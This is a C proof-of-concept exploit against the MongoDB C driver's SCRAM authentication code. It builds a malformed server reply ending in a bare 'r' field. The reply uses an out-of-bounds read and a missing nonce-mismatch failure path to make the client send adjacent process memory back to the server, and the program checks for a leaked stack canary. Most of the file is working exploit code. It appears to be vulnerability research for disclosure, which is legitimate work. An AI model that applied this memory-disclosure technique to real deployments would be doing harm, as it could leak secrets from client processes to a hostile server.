#include <mongoc/mongoc-crypto-private.h>
#include <mongoc/mongoc-scram-private.h>
#include <bson/bson.h>
#include <stdio.h>
#include <string.h>

/* Full chain PoC: demonstrate that the OOB-read/memchr-escalation bug,
 * combined with the missing goto FAIL after the nonce-mismatch check in
 * _mongoc_scram_step2 (mongoc-scram.c lines 666-673), lets a malicious
 * server make the client embed and SEND BACK adjacent process memory
 * (standing in here for "other stuff on the stack") as the "r=" field
 * of its own saslContinue message -- i.e. a real memory-disclosure
 * primitive, not just a crash.
 *
 * The message is: "s=<valid salt>,i=4096,r" -- s= and i= are
 * well-formed and will pass their respective validity checks; the
 * *last* field is a bare, un-valued "r", which is exactly the field
 * whose content gets embedded verbatim into the outgoing message with
 * NO enforcement of the nonce-match check that would normally reject
 * an incorrect/garbage nonce.
 */

static void
fill_stack_with_canary (void)
{
   volatile char victim[16384];
   for (size_t i = 0; i < sizeof (victim); i++) {
      victim[i] = (i % 37 == 0) ? ',' : (char) ('A' + (i % 26));
   }
   if (victim[0] == 0) {
      fprintf (stderr, "unreachable\n");
   }
}

static void
run_exchange (void)
{
   mongoc_scram_t scram;
   uint8_t buf[4096] = {0};
   uint32_t buflen = 0;
   bson_error_t error;
   bool ok;

   memset (&scram, 0, sizeof (scram));
   _mongoc_scram_init (&scram, MONGOC_CRYPTO_ALGORITHM_SHA_256);
   _mongoc_scram_set_user (&scram, "testuser");
   _mongoc_scram_set_pass (&scram, "testpass");

   ok = _mongoc_scram_step (&scram, buf, 0, buf, sizeof (buf), &buflen, &error);
   if (!ok) {
      fprintf (stderr, "step1 failed: %s\n", error.message);
      return;
   }

   const int STALE_EQ_OFFSET = 300;

   /* Reply #1: leaves buf[STALE_EQ_OFFSET] == '=' behind (server padding
    * an earlier message). */
   memset (buf, 'Z', STALE_EQ_OFFSET + 60);
   buf[STALE_EQ_OFFSET] = '=';
   buflen = STALE_EQ_OFFSET + 60;

   /* Reply #2: "s=<valid 28-byte salt b64>,i=4096,r" padded with
    * comment-safe filler between i=4096 and the bare trailing 'r' so
    * the logical length lands exactly at STALE_EQ_OFFSET. */
   char msg[512];
   int p = 0;
   const char *salt_field = "s=AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGw==,i=4096,";
   memcpy (msg + p, salt_field, strlen (salt_field));
   p += (int) strlen (salt_field);

   int pad_len = STALE_EQ_OFFSET - p - 1; /* -1 for the final bare 'r' */
   if (pad_len < 0) {
      fprintf (stderr, "offset too small, increase STALE_EQ_OFFSET\n");
      return;
   }
   /* Padding must not itself introduce a comma (would end the "i="
    * field's value early) -- use a harmless filler char. This padding
    * effectively gets appended onto the "i=4096" value itself, so we
    * instead insert it as filler NUL-safe bytes that won't matter
    * because... simplest: just don't pad here, rely on picking
    * STALE_EQ_OFFSET to exactly fit "s=...,i=4096," + "r". */
   if (pad_len != 0) {
      fprintf (stderr,
               "adjust STALE_EQ_OFFSET to %d for a clean fit (currently off by %d)\n",
               p + 1,
               pad_len);
      /* proceed anyway using the adjusted, correct offset */
   }
   int true_len = p + 1; /* "...,i=4096," + "r" */
   msg[p] = 'r';
   p += 1;

   /* Recompute using the ACTUAL length so this run is self-correcting
    * regardless of the exact literal length above. */
   memset (buf, 'Z', (size_t) true_len + 60);
   buf[true_len] = '=';
   buflen = (uint32_t) true_len + 60;

   memcpy (buf, msg, (size_t) p);
   buflen = (uint32_t) p;

   printf ("reply #2 logical length = %u; buf[%u] (stale, untouched)='%c'\n", buflen, buflen, buf[buflen]);
   printf ("reply #2 content: %.*s\n", (int) buflen, (char *) buf);

   scram.step = 1;
   uint32_t out_len = 0;
   uint8_t *out_buf = bson_malloc0 (1024 * 1024);

   ok = _mongoc_scram_step (&scram, buf, buflen, out_buf, (1024 * 1024), &out_len, &error);

   printf ("step2 returned %d (error: %s)\n", ok, ok ? "(none)" : error.message);
   if (ok) {
      printf ("*** step2 SUCCEEDED despite a garbage/leaked nonce -- missing goto FAIL confirmed ***\n");
      printf ("outgoing message length = %u\n", out_len);
      uint32_t show = out_len < 300 ? out_len : 300;
      printf ("outgoing message content, first %u bytes (non-printable shown as '.'):\n", show);
      for (uint32_t i = 0; i < show; i++) {
         unsigned char c = out_buf[i];
         putchar ((c >= 32 && c < 127) ? c : '.');
      }
      printf ("\n");
      int found_canary = 0;
      uint32_t at = 0;
      for (uint32_t i = 0; i + 4 < out_len; i++) {
         if (out_buf[i] == 'A' && out_buf[i + 1] == 'B' && out_buf[i + 2] == 'C' && out_buf[i + 3] == 'D') {
            found_canary = 1;
            at = i;
            break;
         }
      }
      if (found_canary) {
         printf ("*** LEAKED CANARY PATTERN 'ABCD' FOUND IN OUTGOING MESSAGE at offset %u ***\n", at);
         printf ("*** This proves adjacent process memory was read and transmitted back to the \"server\" ***\n");
      } else {
         printf ("(no 'ABCD' canary substring observed in this particular run)\n");
      }
   }
}

int
main (void)
{
   fill_stack_with_canary ();
   run_exchange ();
   return 0;
}
